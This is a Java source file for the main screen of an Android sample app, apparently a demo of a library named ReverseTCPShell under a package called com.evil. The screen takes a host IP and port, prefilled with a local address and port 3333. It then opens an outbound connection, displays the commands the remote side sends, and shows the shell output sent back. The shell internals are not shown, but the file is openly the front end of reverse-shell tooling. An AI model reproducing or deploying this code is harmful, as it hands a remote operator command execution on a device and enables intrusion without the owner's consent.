package com.evil.reversetcpshellandroid.sample.view;

import android.databinding.DataBindingUtil;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.view.ViewGroup;
import android.widget.BaseAdapter;

import com.evil.reversetcpshellandroid.library.ConnectErrorListener;
import com.evil.reversetcpshellandroid.library.ConnectListener;
import com.evil.reversetcpshellandroid.library.ReverseTCPShell;
import com.evil.reversetcpshellandroid.sample.R;
import com.evil.reversetcpshellandroid.sample.databinding.ActivityMainBinding;
import com.evil.reversetcpshellandroid.sample.databinding.LayoutListItemBinding;
import com.evil.reversetcpshellandroid.sample.model.bean.History;

public class MainActivity extends AppCompatActivity {
    private MyAdapter myAdapter;
    private ReverseTCPShell mShell;
    private ActivityMainBinding binding;
    private History history;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        binding = DataBindingUtil.setContentView(this, R.layout.activity_main);
        history = new History();
        binding.setHistory(history);


        myAdapter = new MyAdapter();
        binding.listView.setAdapter(myAdapter);

        //图方便
        binding.ipEdit.setText("192.168.1.135");
        binding.portEdit.setText("3333");

        init();
    }

    private void init() {
        reset();
        binding.button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (mShell == null) {
                    reset();
                    connect();
                } else {
                    reset();
                }
            }
        });
    }

    private void reset() {
        history.historyList.clear();
        if (mShell != null)
            mShell.stop();
        mShell = null;
        resetView();
    }

    private void resetView() {
        binding.ipEdit.setEnabled(true);
        binding.portEdit.setEnabled(true);
        binding.button.setText("开始连接");
        binding.button.setEnabled(true);
    }

    private void connect() {
        binding.ipEdit.setEnabled(false);
        binding.portEdit.setEnabled(false);
        addText("连接中...");
        binding.button.setText("断开连接");
        binding.button.setEnabled(false);
        doConnect();
    }

    private void doConnect() {
        String ip = binding.ipEdit.getText().toString().trim();
        int port = Integer.valueOf(binding.portEdit.getText().toString().trim());
        ReverseTCPShell.connect(ip, port, new ConnectListener() {
            @Override
            public void connected(ReverseTCPShell shell) {
                mShell = shell;
                binding.button.setEnabled(true);
                addText("成功连接");
            }

            @Override
            public void receiveMessage(String msg) {
                addText("远程:\n" + msg);
            }

            @Override
            public void feedbackMessage(String msg) {
                addText("反馈:\n" + msg);
            }

            @Override
            public void stopped() {
                addText("连接结束");
                mShell = null;
                reset();
            }
        }, new ConnectErrorListener() {
            @Override
            public void error(String msg) {
                reset();
                addText("连接错误\n" + msg);
            }
        });
    }


    public class MyAdapter extends BaseAdapter {
        private LayoutListItemBinding binding;

        @Override
        public int getCount() {
            return history.historyList.size() >= 1 ? history.historyList.size() - 1 : 0;
        }

        @Override
        public Object getItem(int position) {
            return position;
        }

        @Override
        public long getItemId(int position) {
            return position;
        }

        @Override
        public View getView(int position, View convertView, ViewGroup parent) {
            if (convertView == null){
                binding = DataBindingUtil.inflate(getLayoutInflater(), R.layout.layout_list_item
                ,parent, false);
                convertView = binding.getRoot();
                convertView.setTag(binding);
            }else {
                binding = (LayoutListItemBinding) convertView.getTag();
            }
            binding.setText(history.historyList.get(position + 1));
            return convertView;
        }
    }

    private void addText(String msg) {
        history.historyList.add(0, msg);
        myAdapter.notifyDataSetChanged();
    }

}
